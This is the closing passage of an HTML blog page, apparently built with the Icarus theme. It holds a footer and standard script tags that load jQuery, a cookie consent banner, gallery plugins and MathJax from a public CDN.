class="is-size-7">© 2016</p></div><div class="level-end"></div></div></div></footer><script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/moment@2.22.2/min/moment-with-locales.min.js"></script><script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.4/dist/clipboard.min.js" defer></script><script>moment.locale("en");</script><script>var IcarusThemeSettings = {
            article: {
                highlight: {
                    clipboard: true,
                    fold: 'unfolded'
                }
            }
        };</script><script data-pjax src="/js/column.js"></script><script src="/js/animation.js"></script><a id="back-to-top" title="Back to top" href="javascript:;"><i class="fas fa-chevron-up"></i></a><script data-pjax src="/js/back_to_top.js" defer></script><!--!--><!--!--><!--!--><script src="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.js" defer></script><script>window.addEventListener("load", () => {
      window.cookieconsent.initialise({
        type: "info",
        theme: "edgeless",
        static: false,
        position: "bottom-left",
        content: {
          message: "This website uses cookies to improve your experience.",
          dismiss: "Got it!",
          allow: "Allow cookies",
          deny: "Decline",
          link: "Learn more",
          policy: "Cookie Policy",
          href: "https://www.cookiesandyou.com/",
        },
        palette: {
          popup: {
            background: "#edeff5",
            text: "#838391"
          },
          button: {
            background: "#4b81e8"
          },
        },
      });
    });</script><script src="https://cdn.jsdelivr.net/npm/lightgallery@1.10.0/dist/js/lightgallery.min.js" defer></script><script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.8.1/dist/js/jquery.justifiedGallery.min.js" defer></script><script>window.addEventListener("load", () => {
            if (typeof $.fn.lightGallery === 'function') {
                $('.article').lightGallery({ selector: '.gallery-item' });
            }
            if (typeof $.fn.justifiedGallery === 'function') {
                if ($('.justified-gallery > p > .gallery-item').length) {
                    $('.justified-gallery > p > .gallery-item').unwrap();
                }
                $('.justified-gallery').justifiedGallery();
            }
        });</script><!--!--><!--!--><script type="text/javascript" id="MathJax-script" async>MathJax = {
      tex: {
        inlineMath: [['$', '$'], ['\\(', '\\)']]
      },
      svg: {
        fontCache: 'global'
      },
      chtml: {
        matchFontHeight: false
      }
    };</script><script src="https://cdn.jsdelivr.net/npm/mathjax@3.2.2/es5/tex-mml-chtml.js"></script><!--!--><!--!--><!--!--><script data-pjax src="/js/main.js" defer></script><!--!--></body></html>